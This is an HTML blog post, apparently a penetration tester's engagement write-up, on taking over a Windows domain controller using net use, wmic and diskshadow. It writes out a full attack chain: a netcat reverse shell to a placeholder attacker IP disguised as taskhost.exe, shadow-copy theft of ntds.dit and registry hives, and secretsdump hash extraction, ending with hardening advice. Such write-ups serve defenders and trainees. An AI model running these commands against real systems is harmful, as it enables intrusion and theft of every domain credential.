@@ -1,0 +1,287 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Pwning a Domain Controller with net use</title>
+    <link rel="icon" href="/favicon.ico" sizes="any">
+    <link rel="icon" type="image/png" href="/favicon.ico">
+    <link rel="apple-touch-icon" href="/favicon.ico">
+    <link rel="stylesheet" href="/assets/css/custom.css">
+  </head>
+  <body>
+    <main class="page-content" aria-label="Content">
+      <div class="post">
+  <nav class="post-nav">
+    <a href="/">&larr; back</a>
+  </nav>
+
+  <article>
+    <h1 class="post-title">Pwning a Domain Controller with net use</h1>
+    <span class="post-date-detail">February 06, 2026</span>
+    <h1 id="intro">intro</h1>
+
+<p>In this post I will discuss how using a simple built-in Windows utility can allow for a full Domain Controller takeover.</p>
+
+<p><strong>All native CLI. No PowerShell. No custom tooling on-target. Low-priv to domain creds.</strong></p>
+
+<h2 id="the-scenario">the scenario</h2>
+
+<p>My team and I were recently on a network engagement where our client wanted to lock us down. We were given limited access (per usual), denied from using PowerShell, and also had difficulties running collectors / scripts.</p>
+
+<p>Our foothold was a standard domain-joined workstation as a low-privilege user. No local admin. No special group memberships — just a basic domain user in a couple of mundane groups.</p>
+
+<h2 id="enumeration-is-key">enumeration is key</h2>
+
+<p>After running through my normal routine of checking for escalation points, I went back to the basics, enumeration.</p>
+
+<p>It is kinda crazy how little bits of information can be strung together to paint the bigger picture. When doing real life engagements you often forget <strong>real</strong> humans are operating these machines (this comes from doing too much CTF’s). Because of this, people or services configured by humans have the potential to <em>leak</em> information that would at first seem insignificant.</p>
+
+<h3 id="finding-local-admins">finding local admins</h3>
+
+<p>The first thing I wanted to know — who has admin on this box?</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Users\[USER]&gt;net localgroup administrators
+
+Members
+
+---------------------------------------------------------------
+localadmin
+[DOMAIN]\Domain Admins
+[DOMAIN]\[AdminGroup]
+[DOMAIN]\svc_[redacted]
+[DOMAIN]\svc_[redacted2]
+The command completed successfully.
+</code></pre></div></div>
+
+<p>Two service accounts immediately stood out as members of the local Administrators group: <strong>svc_[redacted]</strong> and <strong>svc_[redacted2]</strong>. Service accounts with local admin is always worth investigating further.</p>
+
+<h3 id="finding-the-domain-controllers">finding the domain controllers</h3>
+
+<p>Next, let’s find what we are working with:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Users\[USER]&gt;nltest /dclist:%USERDOMAIN%
+Get list of DCs in domain '[DOMAIN]' from '\\DC-01'.
+  DC-01.[domain].local [PDC]  [DS] Site: [SITE]
+  DC-02.[domain].local        [DS] Site: [SITE]
+  DC-03.[domain].local        [DS] Site: [SITE]
+The command completed successfully.
+</code></pre></div></div>
+
+<p>Three Domain Controllers. Good to know.</p>
+
+<h3 id="the-password-in-plaintext">the password in plaintext</h3>
+
+<p>While browsing the local filesystem for anything interesting, I found a configuration file sitting in <code class="language-plaintext highlighter-rouge">C:\Temp</code>. It was associated with a monitoring agent deployment — the kind of init script that gets dropped during software rollouts and never cleaned up.</p>
+
+<p>I opened it and found a service account password in <strong>plaintext</strong>, repeated across the file.</p>
+
+<p>This is the kind of thing that happens when automated deployments store credentials in init scripts and nobody goes back to clean them up. One forgotten file, sitting in a temp directory, wide open.</p>
+
+<h3 id="profiling-the-service-account">profiling the service account</h3>
+
+<p>Now I had a username and password. Time to see what this account can do:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Users\[USER]&gt;net user svc_[redacted] /domain
+
+User name                    SVC_[redacted]
+Full Name                    SVC_[redacted]
+Account active               Yes
+Account expires              Never
+Password last set            2/26/2020
+Password expires             Never
+Last logon                   [REDACTED]
+
+Local Group Memberships      *Administrators
+Global Group memberships     *[AdminGroup]     *Domain Users
+The command completed successfully.
+</code></pre></div></div>
+
+<p>Key observations: the account is a member of the <strong>Administrators</strong> local group <em>and</em> a custom admin group. That custom group contained over a dozen service accounts — all with elevated privileges across the domain.</p>
+
+<p>The password had not been changed since <strong>2020</strong>. It never expires.</p>
+
+<h2 id="lateral-movement-with-net-use">lateral movement with net use</h2>
+
+<p>Here is where <code class="language-plaintext highlighter-rouge">net use</code> comes in. With valid credentials for a privileged service account, I tested whether I could map the administrative share on a Domain Controller:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Users\[USER]&gt;net use \\DC-03\C$ /user:svc_[redacted] [REDACTED]
+The command completed successfully.
+</code></pre></div></div>
+
+<p>That is full <strong>C$</strong> access on a Domain Controller. From a low-privilege workstation. Using a built-in Windows command.</p>
+
+<p>With this access, I could now browse the DC filesystem remotely:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Users\[USER]&gt;dir \\DC-03\C$\Users
+
+ Directory of \\DC-03\C$\Users
+
+ Administrator
+ [REDACTED]
+ [REDACTED]
+ Public
+</code></pre></div></div>
+
+<p>I could also verify access to sensitive directories:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Users\[USER]&gt;dir \\DC-03\C$\Windows\System32\config
+</code></pre></div></div>
+
+<h2 id="getting-a-shell-on-the-domain-controller">getting a shell on the domain controller</h2>
+
+<p>Having filesystem access is powerful, but I needed an interactive shell for the next steps. Since PowerShell was blocked, I went old school.</p>
+
+<p><strong>Step 1 — Drop the payload:</strong></p>
+
+<p>Using Chrome on the foothold (it had internet access), I downloaded <code class="language-plaintext highlighter-rouge">nc64.exe</code> from GitHub. I renamed it to blend in and used <code class="language-plaintext highlighter-rouge">net use</code> to copy it to the DC:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Users\[USER]\Documents&gt;copy nc64.exe \\DC-03\C$\Windows\Temp\taskhost.exe
+        1 file(s) copied.
+</code></pre></div></div>
+
+<p><strong>Step 2 — Trigger the reverse shell via WMIC:</strong></p>
+
+<p>From the foothold, I used <code class="language-plaintext highlighter-rouge">wmic</code> to remotely execute the payload on the DC:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Users\[USER]\Documents&gt;wmic /node:"DC-03" /user:"[DOMAIN]\svc_[redacted]" /password:"[REDACTED]" process call create "C:\Windows\Temp\taskhost.exe -e cmd.exe [ATTACKER_IP] 4444"
+
+Executing (Win32_Process)-&gt;Create()
+Method execution successful.
+Out Parameters:
+instance of __PARAMETERS
+{
+        ProcessId = 416;
+        ReturnValue = 0;
+};
+</code></pre></div></div>
+
+<p>On my listener:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Users\[USER]\Documents&gt;nc64.exe -lvnp 4444
+listening on [any] 4444 ...
+connect to [ATTACKER_IP] from (UNKNOWN) [DC_IP] 50528
+Microsoft Windows [Version 10.0.20348.3932]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32&gt;whoami
+[DOMAIN]\svc_[redacted]
+
+C:\Windows\system32&gt;hostname
+DC-03
+</code></pre></div></div>
+
+<p>Admin shell on a Domain Controller. Confirmed with <code class="language-plaintext highlighter-rouge">whoami /priv</code> — full privileges enabled.</p>
+
+<h2 id="extracting-domain-credentials">extracting domain credentials</h2>
+
+<p>With an admin shell on the DC, the goal was to grab the three files needed for <strong>secretsdump</strong>: <code class="language-plaintext highlighter-rouge">ntds.dit</code>, <code class="language-plaintext highlighter-rouge">SYSTEM</code>, and <code class="language-plaintext highlighter-rouge">SECURITY</code>.</p>
+
+<p>The <code class="language-plaintext highlighter-rouge">ntds.dit</code> file is locked by Active Directory while it is running, so you cannot just copy it directly. This is where <strong>diskshadow</strong> comes in.</p>
+
+<p><strong>Step 1 — Create the diskshadow script:</strong></p>
+
+<p>On the foothold, I created a file called <code class="language-plaintext highlighter-rouge">ds.txt</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>set context persistent nowriters
+add volume c: alias myshadow
+create
+expose %myshadow% z:
+</code></pre></div></div>
+
+<p>Then copied it to the DC:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Users\[USER]&gt;copy ds.txt \\DC-03\C$\Temp\ds.txt
+</code></pre></div></div>
+
+<p><strong>Step 2 — Run diskshadow from the DC shell:</strong></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Windows\system32&gt;diskshadow /s C:\Temp\ds.txt
+</code></pre></div></div>
+
+<p>This creates a shadow copy of the C: drive and exposes it as <code class="language-plaintext highlighter-rouge">Z:</code>. Now I can copy the locked <code class="language-plaintext highlighter-rouge">ntds.dit</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Windows\system32&gt;copy Z:\Windows\NTDS\ntds.dit C:\Temp
+</code></pre></div></div>
+
+<p>And grab <code class="language-plaintext highlighter-rouge">SYSTEM</code> and <code class="language-plaintext highlighter-rouge">SECURITY</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Windows\system32&gt;copy C:\Windows\System32\config\SYSTEM C:\Temp\SYSTEM
+C:\Windows\system32&gt;copy C:\Windows\System32\config\SECURITY C:\Temp\SECURITY
+</code></pre></div></div>
+
+<p><strong>Step 3 — Exfil back to foothold:</strong></p>
+
+<p>From the low-priv CLI on the foothold:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Users\[USER]&gt;copy \\DC-03\C$\Temp\ntds.dit C:\Users\[USER]\Desktop\loot\gold\
+C:\Users\[USER]&gt;copy \\DC-03\C$\Temp\SYSTEM C:\Users\[USER]\Desktop\loot\gold\
+C:\Users\[USER]&gt;copy \\DC-03\C$\Temp\SECURITY C:\Users\[USER]\Desktop\loot\gold\
+</code></pre></div></div>
+
+<p><strong>Step 4 — Dump the hashes:</strong></p>
+
+<p>Offloaded the files to my attack machine and ran Impacket’s <code class="language-plaintext highlighter-rouge">secretsdump.py</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python secretsdump.py <span class="nt">-ntds</span> ntds.dit <span class="nt">-system</span> SYSTEM <span class="nt">-security</span> SECURITY LOCAL
+</code></pre></div></div>
+
+<p>Every domain account. Every hash. Full domain compromise.</p>
+
+<h2 id="cleanup">cleanup</h2>
+
+<p>This part is just as important as the exploit. Always clean up after yourself:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Windows\system32&gt;vssadmin list shadows
+C:\Windows\system32&gt;wmic shadowcopy delete
+</code></pre></div></div>
+
+<p>Remove all artifacts from the DC:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Users\[USER]&gt;del \\DC-03\C$\Temp\ntds.dit
+C:\Users\[USER]&gt;del \\DC-03\C$\Temp\SYSTEM
+C:\Users\[USER]&gt;del \\DC-03\C$\Temp\SECURITY
+C:\Users\[USER]&gt;del \\DC-03\C$\Temp\ds.txt
+C:\Users\[USER]&gt;del \\DC-03\C$\Windows\Temp\taskhost.exe
+</code></pre></div></div>
+
+<p>Verify everything is gone. Leave no trace.</p>
+
+<h2 id="key-takeaways">key takeaways</h2>
+
+<p>This entire attack chain — from low-privilege user to full domain compromise — was executed with <strong>nothing but native Windows commands</strong>: <code class="language-plaintext highlighter-rouge">net localgroup</code>, <code class="language-plaintext highlighter-rouge">net user</code>, <code class="language-plaintext highlighter-rouge">net use</code>, <code class="language-plaintext highlighter-rouge">nltest</code>, <code class="language-plaintext highlighter-rouge">copy</code>, <code class="language-plaintext highlighter-rouge">dir</code>, <code class="language-plaintext highlighter-rouge">wmic</code>, <code class="language-plaintext highlighter-rouge">diskshadow</code>, and <code class="language-plaintext highlighter-rouge">vssadmin</code>.</p>
+
+<p>No PowerShell. No Mimikatz. No custom C2. No exploits. Just built-in tools that are present on every Windows machine.</p>
+
+<p>The root causes:</p>
+
+<ul>
+  <li><strong>Plaintext credentials in a leftover deployment file</strong> — the initial foothold into privilege</li>
+  <li><strong>Service account with excessive privileges</strong> — local admin on workstations <em>and</em> Domain Controllers</li>
+  <li><strong>Password that hadn’t been rotated in 5+ years</strong> — and set to never expire</li>
+  <li><strong>No monitoring or alerting</strong> on administrative share access or remote process creation via WMIC</li>
+</ul>
+
+<p>If your organization uses service accounts, audit them. Check where their credentials are stored. Rotate them. Restrict their scope. One forgotten config file in a temp directory gave us the keys to the entire domain.</p>
+
+<h1 id="end">end</h1>
+
+  </article>
+</div>
+
+    </main>
+    <footer class="site-footer">
+      <div class="footer-icons">
+        <a href="https://github.com/t3lesph0re" target="_blank" rel="noopener" aria-label="GitHub">
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 22v-4a4.8 4.8 0 0 0-1-3.5c3 0 6-2 6-5.5.08-1.25-.27-2.48-1-3.5.28-1.15.28-2.35 0-3.5 0 0-1 0-3 1.5-2.64-.5-5.36-.5-8 0C6 2 5 2 5 2c-.3 1.15-.3 2.35 0 3.5A5.403 5.403 0 0 0 4 9c0 3.5 3 5.5 6 5.5-.39.49-.68 1.05-.85 1.65-.17.6-.22 1.23-.15 1.85v4"/><path d="M9 18c-4.51 2-5-2-7-2"/></svg>
+        </a>
+        <a href="https://www.linkedin.com/in/sebastien-arseneault/" target="_blank" rel="noopener" aria-label="LinkedIn">
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"/><rect width="4" height="12" x="2" y="9"/><circle cx="4" cy="4" r="2"/></svg>
+        </a>
+        <a href="https://deepwoodssec.com" target="_blank" rel="noopener" aria-label="Deep Woods Security">
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m17 14 3 3.3a1 1 0 0 1-.7 1.7H4.7a1 1 0 0 1-.7-1.7L7 14h-.3a1 1 0 0 1-.7-1.7L9 9h-.2A1 1 0 0 1 8 7.3L12 3l4 4.3a1 1 0 0 1-.8 1.7H15l3 3.3a1 1 0 0 1-.7 1.7H17Z"/><path d="M12 22v-3"/></svg>
+        </a>
+      </div>
+    </footer>
+  </body>
+</html>
